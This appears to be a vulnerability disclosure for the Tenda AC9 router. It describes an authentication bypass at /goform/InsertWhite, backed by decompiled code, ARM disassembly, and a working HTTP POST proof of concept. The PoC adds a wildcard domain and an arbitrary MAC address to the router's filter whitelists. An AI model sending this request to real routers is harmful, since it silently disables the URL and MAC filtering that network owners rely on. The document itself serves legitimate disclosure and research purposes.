# Tenda AC9 /goform/InsertWhite Unauthenticated URL/MAC Filter Whitelist Tampering

## 1. Vulnerability Name

**Tenda AC9 /goform/InsertWhite Unauthenticated URL/MAC Filter Whitelist Tampering**

## 2. Basic Information

| Field | Content |
| --- | --- |
| **Vendor** | Tenda |
| **Product** | AC9 Dual-Band Wi-Fi Router |
| **Firmware Version** | V1.0 V15.03.05.14_multi / V15.03.05.16 |
| **Firmware File** | 49049A094561CA9365CF129DA98622171BAB8BB8EB5DA83EE8730561DA16F3F1 (SHA256) |

## 3. Vulnerability Principle & Data Flow

The endpoint `/goform/InsertWhite` is matched in the auth-exempt whitelist of `R7WebsSecurityHandler`, so authentication is skipped. The handler `add_white_node` only validates that `mac` is 12 hex characters and `domain` length is ≤254; it does not verify whether the MAC belongs to a real client. The validated values are sent via IPC (`tpi_talk_to_kernel`) to the `netctrl` daemon, which writes them into the kernel URL-FILTER / MAC-FILTER tables. When `domain` uses a wildcard (e.g. `*.com`), all `.com` URL filtering is disabled.

```
HTTP POST /goform/InsertWhite  (no auth)
        │  Body: mac=AABBCCDDEEFF&domain=*.com
        ▼
R7WebsSecurityHandler @ 0x2f0d4
        │  strncmp(url, "/goform/InsertWhite", 0x13) == 0 → return 0 (skip auth)
        ▼
add_white_node @ 0x8c6cc
        │  websGetVar("mac")    → strlen==12 + hex-char check
        │  websGetVar("domain") → length check (≤254)
        ▼
tpi_talk_to_kernel() IPC → netctrl daemon
        ▼
netctrl writes to kernel URL FILTER / MAC FILTER tables
        ▼
*.com added to whitelist → all .com URL filtering disabled
AA:BB:CC:DD:EE:FF added → MAC filtering bypassed
```

## 4. Key Functions

| Function | Address | Role |
| --- | --- | --- |
| `R7WebsSecurityHandler` | `0x2f0d4` | Auth-exempt whitelist; `strncmp(url, "/goform/InsertWhite", 0x13)` → bypass |
| `add_white_node` | `0x8c6cc` | Reads `mac`/`domain`, hex-checks `mac`, sends to `netctrl` via IPC |
| `websGetVar` | `0x2b9fc` | Reads HTTP POST parameter |
| `tpi_talk_to_kernel` | `0xf0f8` | IPC to `netctrl` daemon |
| `netctrl` | — | Writes entries to kernel URL/MAC filter tables |

### R7WebsSecurityHandler @ 0x2f0d4 — auth-exempt bypass

```c
// phase4_decompile_output.txt line 4884 — confirmed by disassembly of httpd
iVar1 = strncmp(url, "/goform/InsertWhite", 0x13);
if (iVar1 == 0) {
    return 0;  // AUTH BYPASS
}
```

```asm
; R7WebsSecurityHandler @ 0x2f0d4 (excerpt, ARM)
0x0002fe7c:  ldr      r3, [pc, #0x278]      ; GOT -> "/goform/InsertWhite" (va 0xdaf04)
0x0002fe80:  ldr      r3, [r4, r3]
0x0002fe84:  mov      r1, r3
0x0002fe88:  bl       #0xf68c               ; strncmp(url, "/goform/InsertWhite", 0x13)
0x0002fe8c:  mov      r3, r0
0x0002fe90:  cmp      r3, #0
0x0002ff14:  mov      r3, #0                ; matched -> passthrough flag = 0
0x0002ff18:  str      r3, [fp, #-0x18]      ; AUTH BYPASS
```

### add_white_node @ 0x8c6cc — MAC hex check + IPC dispatch

```asm
; add_white_node @ 0x8c6cc (excerpt, ARM)
0x0008c738:  ldr      r0, [fp, #-0x140]     ; arg0 = request handle
0x0008c73c:  ldr      r3, [pc, #0x438]      ; GOT -> "mac"
0x0008c740:  add      r3, r4, r3
0x0008c744:  mov      r1, r3                ; arg1 = "mac"
0x0008c754:  bl       #0x2b9fc              ; websGetVar(req, "mac", "")
0x0008c758:  str      r0, [fp, #-0x1c]      ; save mac value
0x0008c75c:  ldr      r0, [fp, #-0x140]
0x0008c760:  ldr      r3, [pc, #0x41c]      ; GOT -> "domain"
0x0008c764:  add      r3, r4, r3
0x0008c768:  mov      r1, r3                ; arg1 = "domain"
0x0008c778:  bl       #0x2b9fc              ; websGetVar(req, "domain", "")
...                                          ; mac length/hex-char loop (no real-client check)
...                                          ; bl  0xf0f8  ; tpi_talk_to_kernel() IPC -> netctrl
```

```c
// decompiled add_white_node @ 0x8c6cc
mac    = websGetVar(param_1, "mac", "");      // strlen==12 + hex-char check only
domain = websGetVar(param_1, "domain", "");   // length check (≤254), wildcards allowed
tpi_talk_to_kernel(...);                       // send to netctrl → kernel filter tables
// netctrl writes *.com into URL FILTER / MAC FILTER tables
```

## 5. Test PoC

```http
POST /goform/InsertWhite HTTP/1.1
Host: <TARGET>:8080
Content-Type: application/x-www-form-urlencoded

mac=AABBCCDDEEFF&domain=*.com
```
